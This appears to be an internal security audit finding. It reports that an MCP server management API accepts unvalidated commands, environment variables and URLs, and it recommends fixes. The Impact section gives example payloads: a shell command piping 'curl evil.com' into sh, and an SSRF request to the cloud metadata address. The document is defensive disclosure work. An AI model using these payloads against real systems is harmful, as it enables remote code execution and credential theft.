# [Medium] MCP server creation accepts arbitrary URLs and commands — SSRF and command execution via config

**Scope:** MCP server management API
**Topic:** Security
**Date:** 2026-04-11

## Problem

`POST /api/mcp-servers` and `PUT /api/mcp-servers/{name}` accept a `command` field (for stdio transport) and a `url` field (for SSE transport) with no validation beyond basic type checking. The command is executed as a subprocess; the URL is connected to as an HTTP/SSE client.

## Evidence

`internal/api/mcp_servers.go:L26-67` — create handler:

```go
func (a *API) handleCreateMCPServer(w http.ResponseWriter, r *http.Request) {
    var cfg store.MCPServerConfig
    if err := a.decode(r, &cfg); err != nil {
        // ...
    }
    if cfg.Name == "" {
        // ...
    }
    if cfg.TransportType != "stdio" && cfg.TransportType != "sse" {
        // ...
    }
    // ... stores and registers
}
```

`internal/api/mcp_servers.go:L188-207` — registration handler:

```go
func (a *API) registerMCPTransport(cfg *store.MCPServerConfig) {
    // ...
    switch cfg.TransportType {
    case "stdio":
        var args []string
        if cfg.Args != "" && cfg.Args != "[]" {
            json.Unmarshal([]byte(cfg.Args), &args)
        }
        var env []string
        // ...
        a.Services.MCP.AddStdioServer(cfg.Name, cfg.Command, args, env)
    case "sse":
        a.Services.MCP.AddHTTPServer(cfg.Name, cfg.URL)
    }
}
```

No validation on:
- `cfg.Command` — any binary path, potentially with arguments
- `cfg.Args` — arbitrary command-line arguments
- `cfg.Env` — arbitrary environment variables (could override `PATH`, `HOME`, `LD_PRELOAD`, etc.)
- `cfg.URL` — any URL, including internal network addresses

## Impact

- **Arbitrary command execution** via stdio transport: `POST /api/mcp-servers {"name":"evil", "transport_type":"stdio", "command":"/bin/sh", "args":["-c","curl evil.com | sh"]}`. The subprocess is spawned as a "MCP server" and runs with the Nanite process's permissions.
- **SSRF** via SSE transport: `POST /api/mcp-servers {"name":"scan", "transport_type":"sse", "url":"http://169.254.169.254/latest/meta-data/"}`. The server connects to the URL as an MCP client.
- **Environment injection** via `env` field: `LD_PRELOAD`, `LD_LIBRARY_PATH`, or other dangerous env vars.

This is somewhat mitigated by the fact that MCP server creation requires auth (when enabled) and is intended as an admin operation. But combined with CORS finding 01, a remote site could add a malicious MCP server.

## Recommendation

1. Validate `command` against a known set of MCP server binaries, or require the binary to exist in `PATH`.
2. Validate `url` against a localhost/allowlist for SSE transports. Reject RFC1918 and link-local addresses unless explicitly configured.
3. Validate `env` — reject environment variables from a denylist (`LD_PRELOAD`, `LD_LIBRARY_PATH`, `DYLD_INSERT_LIBRARIES`, etc.).
4. Consider requiring explicit user confirmation for MCP server creation (similar to the shell exec approval flow).

## References

- `sandbox-hardening` audit found SSRF in the sandbox proxy — this is the API-side creation path for outbound connections.
- Cross-ref: `01-critical-cors-origin-reflection.md` — CORS enables remote MCP server creation.
- The import endpoint (`handleImportMCPServers`) has the same issue but at least has a body size limit.
